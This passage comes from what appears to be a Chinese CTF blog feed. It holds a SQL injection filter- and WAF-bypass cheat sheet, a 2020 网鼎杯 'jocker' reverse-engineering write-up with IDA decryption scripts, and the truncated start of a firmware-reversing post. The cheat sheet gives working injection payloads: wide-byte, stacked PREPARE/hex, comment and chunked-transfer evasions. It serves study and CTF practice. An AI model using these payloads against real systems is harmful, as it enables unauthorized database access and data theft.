id="使用URL编码">使用URL编码</h3><p>我们可以将空格转换为<code>URL</code>编码<code>%20</code>尝试进行绕过，如<code>?id=1'%20and%201=1--%20</code></p><h3 id="使用注释">使用注释</h3><p>我们也可以在中间可以插入<code>/**/</code>，来进行替代空格，如：<code>?id=1'/**/and/**/1=1--/**/</code></p><h3 id="使用Shell变量">使用Shell变量</h3><p>我们可以使用<code>$IFS$1</code>来替代空格，因为<code>$IFS</code>默认是空字符(空格<code>Space</code>、<code>Tab</code>、换行<code>\n</code>)</p><h3 id="使用报错注入">使用报错注入</h3><p>我们可以使用报错注入来进行绕过空格输入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;||extractvalue(1,concat(&#x27;</span><span class="hljs-operator">~</span><span class="hljs-string">&#x27;,(database())))||&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h3 id="使用括号">使用括号</h3><p>我们可以将空格替换为括号进行包裹来进行绕过</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span>(group_concat(table_name))<span class="hljs-keyword">from</span>(information_schema.tables)<span class="hljs-keyword">where</span>(table_schema<span class="hljs-operator">=</span>database())<br></code></pre></td></tr></table></figure><h2 id="逗号过滤">逗号过滤</h2><p>我们可以使用<code>join</code>进行绕过</p><blockquote><p><code>join</code>用于把来自两个或多个表的行结合起来，基于这些表之间的共同字段</p></blockquote><p>我们利用<code>join</code>的特性，则有如下等价：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>等价于</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>)a <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">2</span>)b <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">3</span>)c <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>那么对于我们的查询我们可以修改括号内的数字，将其替换为我们的注入语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>)a <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> database())b <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">3</span>)c <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>因为逗号被过滤了，我们使用<code>group_concat</code>中的逗号将会失效，我们只能对于一个个进行查找，如下示例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>)a <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> group_concat(username,password) <span class="hljs-keyword">from</span> users)b <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">3</span>)c <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>上面的查询语句会被解析为<code>usernamepassword</code>，因此我们就只能改为单个进行查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>)a <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> group_concat(username) <span class="hljs-keyword">from</span> users)b <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">3</span>)c <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h2 id="Union和Select的绕过">Union和Select的绕过</h2><p>我们一般先进行检测对应的闭合方式，随后检测空格等其他方式是否被过滤，之后测试<code>select</code>和<code>union</code></p><h3 id="使用大小写">使用大小写</h3><p>我们将<code>union</code>中的大小写进行改变，如：<code>unIoN</code></p><h3 id="使用复写单词">使用复写单词</h3><p>我们通过将<code>union</code>变形，在其中再插入一个<code>union</code>，如：<code>uniunionon</code></p><h3 id="使用报错注入-2">使用报错注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;||extractvalue(1,concat(&#x27;</span><span class="hljs-operator">~</span><span class="hljs-string">&#x27;,(database())))||&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h3 id="使用url编码">使用url编码</h3><p>我们可以将其中的一些字母转换为<code>url</code>编码尝试进行绕过</p><h2 id="宽字节注入绕过">宽字节注入绕过</h2><p>函数<code>addslashes()</code>函数在指定的预定义字符前添加反斜杠，这些字符是单引号(')、双引号(&quot;)、反斜线(\)、NULL字符</p><p>当存在这个过滤时，我们输入的<code>?id=1' --+</code>会被转义为<code>?id=1\' --+</code>那么数据库会去查找的是<code>1'</code>这个东西</p><p>因此我们使用宽字节注入的目的就是绕过这个转义的过程</p><p>我们利用这种方式进行注入需要利用到<code>GBK编码</code>的特性，我们在单引号前加入一个<code>%df</code>形成<code>%df'</code></p><p>为什么这个方式就可以进行绕过呢？我们根据<code>addslashes()</code>函数的一个特性会在单引号前插入反斜线，在<code>GBK编码</code>中 \ 的编码位为<code>%5c</code>，则构成了一个<code>%df%5c'</code>符合了<code>GBK编码</code>的取值范围(第一个字节129-254，第二个字节64-254)，则其会解析为一个汉字，然后由<code>addslashes()</code>函数所添加的 \ 便会失去应有的作用</p><h2 id="一些其他绕过方式">一些其他绕过方式</h2><h3 id="注释">注释</h3><p>存在过滤时，如<code>union select</code>被防火墙过滤时，我们可以在中间插入注释来尝试混淆绕过</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">union</span> <span class="hljs-comment">/*123*/</span> <span class="hljs-keyword">select</span><br></code></pre></td></tr></table></figure><p>或者是被过滤时我们可以加上<code>!</code>让我们的注释会被执行</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/*!123*/</span><br></code></pre></td></tr></table></figure><p>或者我们还可以加上一串数字如：50000</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/*!50000abc*/</span><br></code></pre></td></tr></table></figure><p>这个表示数据库是<code>5.00.00</code>以上版本时，该语句才会被执行后面的<code>abc</code></p><p>我们还可以使用注释<code>--+</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">uninon <span class="hljs-comment">--+b%0A select</span><br></code></pre></td></tr></table></figure><h3 id="空白符">空白符</h3><p>使用<code>url</code>编码尝试绕过</p><p><code>%09</code>：水平制表</p><p><code>%0a</code>：新一行，<code>MySQL</code>可以让命令分行输入</p><p><code>%0c</code>：新一页</p><p><code>%0b</code>：纵向的 TabLayout</p><h3 id="替换">替换</h3><p>当<code>information_schema.tables</code>被过滤时，我们可以使用另外的两张表</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">sys.schem<span class="hljs-built_in">a_table</span>_statistics_with_buffer<br>sys.x$ps_schem<span class="hljs-built_in">a_table</span>_statistics_io<br></code></pre></td></tr></table></figure><p>当<code>information_schema.columns</code>被过滤时，我们同样可以使用替换，我们采用<code>join</code>获取列名</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-comment">-- 获取第一列列名</span><br><span class="hljs-keyword">union</span> <span class="hljs-comment">/*!70000 xxx*/</span> seleect * <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> * <span class="hljs-comment">/*!70000 xxx*/</span> <span class="hljs-keyword">from</span> <span class="hljs-comment">/*!70000 xxx*/</span> users <span class="hljs-keyword">as</span> a <span class="hljs-keyword">join</span> users <span class="hljs-keyword">as</span> b) <span class="hljs-keyword">as</span> c<br><span class="hljs-comment">-- 获取第二列列名</span><br>uinon <span class="hljs-comment">/*!70000 xxx*/</span> seleect * <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> * <span class="hljs-comment">/*!70000 xxx*/</span> <span class="hljs-keyword">from</span> <span class="hljs-comment">/*!70000 xxx*/</span> users <span class="hljs-keyword">as</span> a <span class="hljs-keyword">join</span> users <span class="hljs-keyword">as</span> b <span class="hljs-keyword">using</span>(id)) <span class="hljs-keyword">as</span> c<br><span class="hljs-comment">-- 获取第三列列名</span><br>uinon <span class="hljs-comment">/*!70000 xxx*/</span> seleect * <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> * <span class="hljs-comment">/*!70000 xxx*/</span> <span class="hljs-keyword">from</span> <span class="hljs-comment">/*!70000 xxx*/</span> users <span class="hljs-keyword">as</span> a <span class="hljs-keyword">join</span> users <span class="hljs-keyword">as</span> b <span class="hljs-keyword">using</span>(id,username)) <span class="hljs-keyword">as</span> c<br></code></pre></td></tr></table></figure><h3 id="超大数据包">超大数据包</h3><p>仅能用于<code>Post</code>提交，对于安全狗<code>3.5</code>版本时，出现被阻拦时会出现<code>'qt-block-indent:0; text-indent'</code>的字样，对此我们可以使用<code>Python</code>的<code>requests</code>库来发送请求包，在我们的注入语句中加入<code>/*!XXX*/</code>更改<code>XXX</code>的长度，来尝试进行传大数据包绕过对应的防火墙</p><h3 id="分块传输绕过">分块传输绕过</h3><p>同样仅适用于<code>Post</code>提交方式，分块出啊u你是将我目的数据拆分成多个部分，然后由服务器端重新组合，然后完成对应的绕过</p><p>需要添加一个分块传输的头</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fortran"><span class="hljs-built_in">Transfer</span>-Encoding: Chunked<br></code></pre></td></tr></table></figure><p>随后使用<code>BurpSuit</code>的相关插件即可完成对应的传输</p><h3 id="堆叠注入">堆叠注入</h3><p>当我们存在有<code>select</code>过滤时，我们大部分的注入方式都失效了，我们此时可以考虑堆叠注入的方式来进行</p><p>我们使用<code>show</code>来查看表名和列名</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pf"><span class="hljs-number">1</span>&#x27;; show columns <span class="hljs-keyword">from</span> <span class="hljs-built_in">table</span>Name;<span class="hljs-comment">#</span><br>--- 或者 --- <br><span class="hljs-number">1</span>&#x27;;desc <span class="hljs-built_in">table</span>Name;<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>注意，如果<code>tableName</code>是纯数字，需要用 ` 包裹，比如 1’;desc `1919810931114514`;#</p><p>当我们找到对应的<code>flag</code>位置后，可以采用预编译的方式拼接<code>select</code>进而绕过对其的过滤</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span>;<span class="hljs-function">PREPARE hacker <span class="hljs-keyword">from</span> <span class="hljs-title">concat</span>(<span class="hljs-params"><span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;elect&#x27;</span>, <span class="hljs-string">&#x27; * from `1919810931114514` &#x27;</span></span>)</span>;EXECUTE hacker;<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p>或者将select * from `1919810931114514` 替换为其16进制的形式</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-number">1</span>&#x27;;PREPARE hacker from 0x<span class="hljs-number">7365</span>6c<span class="hljs-number">65637420</span>2a<span class="hljs-number">206672</span>6f6d<span class="hljs-number">20603139313938</span><span class="hljs-number">31303933313131</span><span class="hljs-number">3435313460</span>;EXECUTE hacker;#<br></code></pre></td></tr></table></figure><blockquote><p><strong>预编译</strong></p><p>预编译相当于定一个语句相同，参数不通的Mysql模板，我们可以通过预编译的方式，绕过特定的字符过滤</p><p>格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">PREPARE 名称 FROM Sql语句 ? ;<br>SET @x=xx;<br>EXECUTE 名称 USING @x;<br></code></pre></td></tr></table></figure><p>举例：查询ID为1的用户：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs text">方法一：<br>SElECT * FROM t_user WHERE USER_ID = 1<br><br>方法二：<br>PREPARE jia FROM &#x27;SElECT * FROM t_user WHERE USER_ID = 1&#x27;;<br>EXECUTE jia;<br><br>方法三：<br>PREPARE jia FROM &#x27;SELECT * FROM t_user WHERE USER_ID = ?&#x27;;<br>SET @ID = 1;<br>EXECUTE jia USING @ID;<br><br>方法四：<br>SET @SQL=&#x27;SElECT * FROM t_user WHERE USER_ID = 1&#x27;;<br>PREPARE jia FROM @SQL;<br>EXECUTE jia;<br></code></pre></td></tr></table></figure></blockquote><h3 id="更改表名">更改表名</h3><ul><li>修改表名：<code>ALTER TABLE 旧表名 RENAME TO 新表名；</code></li><li>修改字段：<code>ALTER TABLE 表名 CHANGE 旧字段名 新字段名 新数据类型；</code></li></ul><h3 id="handle">handle</h3><p>handle不是通用的SQL语句，是Mysql特有的，可以逐行浏览某个表中的数据，格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs text">打开表：<br>HANDLER 表名 OPEN ;<br><br>查看数据：<br>HANDLER 表名 READ next;<br><br>关闭表：<br>HANDLER 表名 READ CLOSE;<br></code></pre></td></tr></table></figure><h3 id="其他">其他</h3><h4 id="万能符号">万能符号</h4><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span>  --&gt; <span class="hljs-built_in">union</span><span class="hljs-comment">/*//--/*/</span><span class="hljs-built_in">select</span><br><span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>  --&gt; <span class="hljs-built_in">union</span> <span class="hljs-comment">/*!--+/*%0aselect/*!1,2,*/</span> <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><h4 id="过滤-substr-和-mid-等">过滤 substr() 和 mid() 等</h4><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-attribute">left</span>() 、 <span class="hljs-attribute">right</span>() 、 mid() 、 substr() 、 substring() 、 lpad() 、 rpad() 等价<br></code></pre></td></tr></table></figure><h3 id="SQL-MOD">SQL_MOD</h3><p><code>SQL_MOD</code>是<code>MySQL</code>支持的基本语法、校验规则</p><p>假如我们有如下查询语句</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-built_in">select</span> $<span class="hljs-variable">_POST</span>[<span class="hljs-string">&#x27;query&#x27;</span>] || <span class="hljs-built_in">flag</span> <span class="hljs-keyword">from</span> <span class="hljs-built_in">Flag</span>;<br></code></pre></td></tr></table></figure><p>当我们的输入在<code>Flag</code>中查询到时，<code>||</code>(或运算符)的作用下会只有非零数字和<code>flag</code>才可以返回真值</p><p>对此我们可以改变<code>||</code>在<code>sql</code>中的语义，将其转换为连接符</p><blockquote><p>其中<code>PIPES_AS_CONCAT</code>:会将<code>||</code>认为字符串的连接符，而不是或运算符，这时<code>||</code>符号就像<code>concat</code>函数一样</p></blockquote><p>我们使用堆叠注入</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">1;<span class="hljs-builtin-name">set</span> <span class="hljs-attribute">sql_mod</span>=PIPES_AS_CONCAT;select 1 <br></code></pre></td></tr></table></figure><p>便可以对<code>||</code>进行绕过</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2020 网鼎杯(青龙组) jocker</title>
    <link href="/2022/08/15/2020%20%E7%BD%91%E9%BC%8E%E6%9D%AF(%E9%9D%92%E9%BE%99%E7%BB%84)%20jocker/"/>
    <url>/2022/08/15/2020%20%E7%BD%91%E9%BC%8E%E6%9D%AF(%E9%9D%92%E9%BE%99%E7%BB%84)%20jocker/</url>
    
    <content type="html"><![CDATA[<p>拿到程序，拖入<code>IDA</code>进行反编译，我们可以获取到一些基本的信息</p><p><img src="https://s2.loli.net/2022/08/15/iSut91mNQpGCOb6.png" alt="1.png"></p><p>我们可以得到<code>flag</code>的长度为<code>24</code>，同时点击对应的<code>encrypt</code>可以发现跳到的是一个地址，我们可以断定是一个<code>SMC</code>程序，程序将我们的输入保存了两份，第一份用来判断是否是假的<code>flag</code>，第二部分用于真正的加密，同时判断是否与<code>flag</code>加密后相同</p><p>我们可以利用一个<code>SMC</code>解密脚本进行手动解密来进行静态分析，而不是动态调试来进行解密</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> idc<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">aPatch</span>(<span class="hljs-params">start,end,key</span>):</span><br>    n=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span>(start+n!=end+<span class="hljs-number">1</span>):<br>        addr=start+n<br>        idc.patch_byte(addr,idc.get_wide_byte(addr)^key)<br>        n+=<span class="hljs-number">1</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;%d Byte has been changed&quot;</span>%n)<br><br>codeStart=<span class="hljs-number">0x401500</span><br>codeLen=<span class="hljs-number">187</span><br>xorData=<span class="hljs-number">0x41</span><br>aPatch(codeStart,codeStart+codeLen-<span class="hljs-number">1</span>,xorData)<br></code></pre></td></tr></table></figure><p>我们观察<code>wrong</code>函数，也就是一个简单的加密</p><p><img src="https://s2.loli.net/2022/08/15/KmwvSnIWghH9etZ.png" alt="2.png"></p><p>十分简单的我们便可以写出逆过程</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs py">enc = [<span class="hljs-number">0x000066</span>, <span class="hljs-number">0x00006B</span>, <span class="hljs-number">0x000063</span>, <span class="hljs-number">0x000064</span>, <span class="hljs-number">0x00007F</span>, <span class="hljs-number">0x000061</span>, <span class="hljs-number">0x000067</span>, <span class="hljs-number">0x000064</span>, <span class="hljs-number">0x00003B</span>, <span class="hljs-number">0x000056</span>, <span class="hljs-number">0x00006B</span>, <span class="hljs-number">0x000061</span>, <span class="hljs-number">0x00007B</span>, <span class="hljs-number">0x000026</span>, <span class="hljs-number">0x00003B</span>, <span class="hljs-number">0x000050</span>, <span class="hljs-number">0x000063</span>, <span class="hljs-number">0x00005F</span>, <span class="hljs-number">0x00004D</span>, <span class="hljs-number">0x00005A</span>, <span class="hljs-number">0x000071</span>, <span class="hljs-number">0x00000C</span>, <span class="hljs-number">0x000037</span>, <span class="hljs-number">0x000066</span>]<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">de1</span>(<span class="hljs-params">a</span>):</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">24</span>):<br>        <span class="hljs-keyword">if</span> i&amp;<span class="hljs-number">1</span> !=<span class="hljs-number">0</span> :<br>            a[i] += i<br>        <span class="hljs-keyword">else</span>:<br>            a[i]^=i<br><br>de1(enc)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc)):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(enc[i]),end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># flag&#123;fak3_alw35_sp_me!!&#125;</span><br></code></pre></td></tr></table></figure><p>明显的看出来这个就是一个<code>Fake Flag</code>，我们观察下面的函数</p><p><img src="https://s2.loli.net/2022/08/15/nSdAEF23QWhw9ci.png" alt="3.png"></p><p>同样的是一个异或，但是执行这个脚本我们会发现少了后面的<code>5</code>位<code>Flag</code>，此时我们有下面的一个函数：</p><p><img src="https://s2.loli.net/2022/08/15/L1B2sPpm7wzCdJ4.png" alt="4.png"></p><p>可以发现这个函数比较的难看，我们已知<code>flag</code>最后一位必定为<code>&#125;</code>，我们猜测最后一个加密与前面相同，同样是异或，经过简单的尝试后，发现没有问题…</p><p>于是我们便可以得到如下脚本对完整的<code>flag</code>进行解密</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs py">enc2 = [<span class="hljs-number">0x0000000E</span>, <span class="hljs-number">0x0000000D</span>, <span class="hljs-number">0x00000009</span>, <span class="hljs-number">0x00000006</span>, <span class="hljs-number">0x00000013</span>, <span class="hljs-number">0x00000005</span>, <span class="hljs-number">0x00000058</span>, <span class="hljs-number">0x00000056</span>, <span class="hljs-number">0x0000003E</span>, <span class="hljs-number">0x00000006</span>, <span class="hljs-number">0x0000000C</span>, <span class="hljs-number">0x0000003C</span>, <span class="hljs-number">0x0000001F</span>, <span class="hljs-number">0x00000057</span>, <span class="hljs-number">0x00000014</span>, <span class="hljs-number">0x0000006B</span>, <span class="hljs-number">0x00000057</span>, <span class="hljs-number">0x00000059</span>, <span class="hljs-number">0x0000000D</span>]<br>xor_data =<span class="hljs-string">&quot;hahahaha_do_you_find_me?&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">19</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(enc2[i]^<span class="hljs-built_in">ord</span>(xor_data[i])),end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br>enc3 =<span class="hljs-string">&quot;%tp&amp;:&quot;</span><br>xor_data2 = <span class="hljs-built_in">ord</span>(enc3[-<span class="hljs-number">1</span>])^<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;&#125;&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc3)):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(enc3[i])^xor_data2),end=<span class="hljs-string">&#x27;&#x27;</span>)<br>    <br><span class="hljs-comment"># flag&#123;d07abccf8a410cb37a&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Reverse</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>第一次固件逆向 —— cnss招新 IDA bao zha le</title>
    <link href="/2022/08/13/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91%20%E2%80%94%E2%80%94%20cnss%E6%8B%9B%E6%96%B0%20IDA%20bao%20zha%20le/"/>
    <url>/2022/08/13/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91%20%E2%80%94%E2%80%94%20cnss%E6%8B%9B%E6%96%B0%20IDA%20bao%20zha%20le/</url>
    
    <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>第一次接触固件逆向，写题期间还是收获了许多东西，将这第一次逆向过程记录一下，方便日后补充学习相关东西，也希望能给第一次接触固件逆向的后人一定参考</p><h2 id="设置IDA">设置IDA</h2><p>最开始拿到这个固件时，以为是<code>elf</code>文件转换成了<code>bin</code>文件，然后根据题目的<code>ARM</code>傻乎乎的去配置<code>Linux</code>装了一个<code>arm-linux-objdump</code>把给的<code>bin</code>转换成了一个<code>asm</code>汇编文件…打开一看，整个人都不想写了，太长了…还全都是汇编…后续找到的有关资料发现<code>IDA</code>其实也可以进行固件的分析，只不过需要进行相关的设置</p><p><img src="https://s2.loli.net/2022/08/12/XHLtdzln1A6qS3I.png" alt="1.png"></p><p><img src="https://s2.loli.net/2022/08/12/TqmBs8YMfiNHQVS.png" alt="2.png"></p><p>设置完后我们点<code>ok</code>即可，随后我们进入<code>IDA</code>会遇到这样的一个界面：</p><p><img src="https://s2.loli.net/2022/08/12/NqgGaVrQeR5Cvmf.png" alt="4.png"></p><p>因为这个是一个固件需要我们手动进行加载对应固件程序的偏移，因为我们是第一次打开，没有获得相关的一些信息，所以此处我们直接点<code>OK</code>进入下一步即可</p><p><img src="https://s2.loli.net/2022/08/12/prnum5DVwYoIyke.png" alt="5.png"></p><p><img src="https://s2.loli.net/2022/08/12/iuMU1GIk6cHBozD.png" alt="6.png"></p><p>到此处我们的基本设置就已经完成了，接下来就是找到对应的程序加载基址和程序的入口点了</p><h2 id="逆向分析">逆向分析</h2><p><img src="https://s2.loli.net/2022/08/12/jCMkKFUEXmr8HoG.png" alt="7.png"></p><blockquote><p>图片里的<code>加载基质</code>打错了应该是<code>加载基址</code></p></blockquote><p>设置完<code>IDA</code>我们对着开头的数据按几下<code>d</code>，将其数据类型进行转换，一般来说在固件<code>arm</code>中，前两个地址为<code>RAM</code>地址和程序入口点，随后双击程序入口进行跳转，随后按<code>C</code>进行构建函数</p><p><img src="https://s2.loli.net/2022/08/12/wdV15e2AxCDMzfq.png" alt="8.png"></p><p>我们可以跳转到函数了，随后我们可以通过字符串来快速定位对应的加密函数块</p><p><img src="https://s2.loli.net/2022/08/12/5iadKpDkr8JNxS3.png" alt="9.png"></p><p><img src="https://s2.loli.net/2022/08/12/Sk5jMVJ7XNfICvU.png" alt="10.png"></p><p>可以发现程序下面的<code>printf</code>会输出对应的<code>flag</code>通过交叉引用我们可以发现对应<code>flag</code>的生成过程</p><p><img src="https://s2.loli.net/2022/08/12/bLYMOPVuvJ93BlW.png" alt="11.png"></p><p><img src="https://s2.loli.net/2022/08/12/MF5OZ72Jajp3emW.png" alt="12.png"></p><p>可以看出来程序每一次对应的异或值会随着<code>i</code>的变化而变化，程序会根据<code>i%6</code>的值进行改变，简单分析可以写出对应的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">s = [<span class="hljs-number">0x00000052</span>, <span class="hljs-number">0x0000005F</span>, <span class="hljs-number">0x00000047</span>, <span class="hljs-number">0x00000046</span>, <span class="hljs-number">0x0000004A</span>, <span class="hljs-number">0x00000061</span>, <span class="hljs-number">0x0000006E</span>, <span class="hljs-number">0x00000042</span>, <span 